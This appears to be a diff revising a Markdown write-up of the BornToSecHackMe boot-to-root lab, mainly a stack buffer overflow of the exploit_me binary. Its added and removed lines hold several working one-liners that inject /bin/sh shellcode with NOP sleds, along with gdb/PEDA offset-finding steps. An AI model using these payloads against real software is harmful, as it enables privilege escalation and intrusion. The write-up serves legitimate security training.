@@ -924,7 +924,7 @@ thor@BornToSecHackMe:~$
 ```
 ### The Turtle
 
-`turtle` is an ASCII text file containing a series of instructions that lead to the word "SLASH":
+`turtle` is an ASCII text file containing a series of instructions that, translated into "[turtle](https://pythonsandbox.com/turtle) code" lead to the word "SLASH":
 ![[pythonsandbox-canvas.png]]
 ```
 ┌──(fab㉿kali)-[~]
@@ -1029,59 +1029,31 @@ bool main(int param_1,int param_2)
 }
 ```
 
-Since Libc is used, we can maybe make the program execute a function like `execve()` through a [buffer overflow](https://pointerless.wordpress.com/2012/02/26/strcpy-security-exploit-how-to-easily-buffer-overflow).
-
-1040 – 46 – 4 = 990 bytes left for our NOP slide.
-I have to inject 140 + 12 + 4 = 156
-for me 156 - 50 = 106 of NOP
-https://reverseengineering.stackexchange.com/questions/27826/using-a-buffer-overflow-to-call-a-function
-
+Since the LibC is used, we can maybe make the program [call a function](https://reverseengineering.stackexchange.com/questions/27826/using-a-buffer-overflow-to-call-a-function) like `execve()` through a [buffer overflow](https://pointerless.wordpress.com/2012/02/26/strcpy-security-exploit-how-to-easily-buffer-overflow):
 ![[Pasted image 20240424184520.png]]
 
+Among the tools available by default on Linux to analyze an executable, we have `readelf`, `objdumps`, `nm`, `gdb`, `dmesg`.. Please refer to this [write-up](https://jaybailey216.com/pwn-challenge-bat-computer) to see some of these tools at work.
+
+To create a buffer overflow we can use Python:
 ```
 ./exploit_me $(python -c "print '\x90'*37+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A'*100 +'\xb0\xf6\xff\xbf'")
 ```
 
-```
-readelf
-```
+However, for this challenge we will use Perl.
 
-http://shell-storm.org/shellcode/files/shellcode-827.html
+To understand what to do, we will use [PEDA](https://github.com/longld/peda), which stands for Python Exploit Development Assistance for GDB.
 
-```
-./exploit_me `perl -e 'print "A"x102 . "\x60\xf3\xff\xbf" . "\x31\xC0\xB0\x46\x31\xDB\x31\xC9\xCD\x80\xEB\x16\x5B\x31\xC0\x88\x43\x07\x89\x5B\x08\x89\x43\x0C\xB0\x0B\x8D\x4B\x08\x8D\x53\x0C\xCD\x80\xE8\xE5\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68"'`
-```
-
-[shellcode](https://www.arsouyes.org/blog/2019/54_Shellcode/index.en.html)
-```
-./exploit_me `perl -e 'print "\x90"x990 . "\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05" . "\xe0\xf6\xff\xbf"'`
-```
-
-We use [PEDA](https://github.com/longld/peda), for Python Exploit Development Assistance for GDB.
-
-We launch our executable and we test it with a long line of 'A':
+We launch our executable and we test it with a line of 'A' longer than 140 characters, the size of the `local_90` buffer:
 ```
 ┌──(fab㉿kali)-[~/rainfall/b2r]
 └─$ gdb exploit_me
 ```
 ![[Pasted image 20240425135544.png]]
 ![[Pasted image 20240425135608.png]]
-We see that the EBP register contains the hexadecimal string 0x41414141, or four times the letter 'A', as we can see from the ASCII table:
+We see that the EBP register contains the hexadecimal string 0x41414141, (four times the letter 'A'), as we can see from the ASCII table:
 ![[Pasted image 20240425135520.png]]
 
-We would like to enter malicious code into the EIP register.
-
-
-
-
-
-
-ça a fait un truc:
-```
-`perl -e 'print "A"x102 . "\x60\xf3\xff\xbf" . "\x90"x10 . "\x31\xC0\xB0\x46\x31\xDB\x31\xC9\xCD\x80\xEB\x16\x5B\x31\xC0\x88\x43\x07\x89\x5B\x08\x89\x43\x0C\xB0\x0B\x8D\x4B\x08\x8D\x53\x0C\xCD\x80\xE8\xE5\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68"'`
-```
-
-![[Pasted image 20240425140954.png]]
+Our goal is to enter malicious code into the EIP register.
 
 We try to make the program crash with a random string of 200 characters:
 ```
@@ -1095,7 +1067,7 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
 
 ![[Pasted image 20240425141610.png]]
 
-We calculate the offset towards EIP:
+We calculate the offset towards EIP, by taking the string contained in EIP ("6Ae7"):
 ```
 ┌──(fab㉿kali)-[~]
 └─$ msf-pattern_offset -q 6Ae7
@@ -1107,7 +1079,6 @@ We calculate the offset towards EIP:
 We need to pad our input with 140 characters before adding our shellcode that will be written on the memory.
 
 However, we need to find the address of the ESP where a pointer to the previous instruction is stored:
-
 ```
 gdb-peda$ run `perl -e 'print "A"x140'`
 <SNIP>
@@ -1127,20 +1098,33 @@ gdb-peda$ q
 ┌──(fab㉿kali)-[~/rainfall/b2r]
 └─$ ./exploit_me `perl -e 'print "A"x140 . "\xc0\xce\xff\xff" . "\x90"x30 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`
 ```
+It doesn't work, but it doesn't matter, because:
+1. the address contained in ESP will be different in the remote session;
+2. the shellcode has to be adapted to the system architecture of the executable file.
 
+I had it work by slightly modifying my command and by adding a different shellcode, found [here](https://pointerless.wordpress.com/2012/02/26/strcpy-security-exploit-how-to-easily-buffer-overflow).
 
-[shellcode](http://shell-storm.org/shellcode/files/shellcode-904.html)
+For a start, I made the program crash and ran the `dmesg` command to find the address of the ESP:
 ```
-./exploit_me `perl -e 'print "A"x140 . "\xc0\xce\xff\xff" . "\x90"x30 . "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"'`
+zaz@BornToSecHackMe:~$ dmesg | tail -1
+[21309.218795] exploit_me[18468]: segfault at 46b0c031 ip 46b0c031 sp bffff6b0 error 14
+zaz@BornToSecHackMe:~$
 ```
+![[Pasted image 20240425154932.png]]
+And then I smashed it:
+```
+zaz@BornToSecHackMe:~$ dmesg | tail -1
+[21309.218795] exploit_me[18468]: segfault at 46b0c031 ip 46b0c031 sp bffff6b0 error 14
+zaz@BornToSecHackMe:~$ ./exploit_me `perl -e 'print "A"x140 . "\xb0\xf6\xff\xbf" . "\x90"x35 . "\x31\xC0\xB0\x46\x31\xDB\x31\xC9\xCD\x80\xEB\x16\x5B\x31\xC0\x88\x43\x07\x89\x5B\x08\x89\x43\x0C\xB0\x0B\x8D\x4B\x08\x8D\x53\x0C\xCD\x80\xE8\xE5\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68"'`
+```
+![[Pasted image 20240425153034.png]]
 
 
 
 
 
-
-
-
+[shellcode](https://www.arsouyes.org/blog/2019/54_Shellcode/index.en.html)
+http://shell-storm.org/shellcode/files/shellcode-827.html
 
 
 
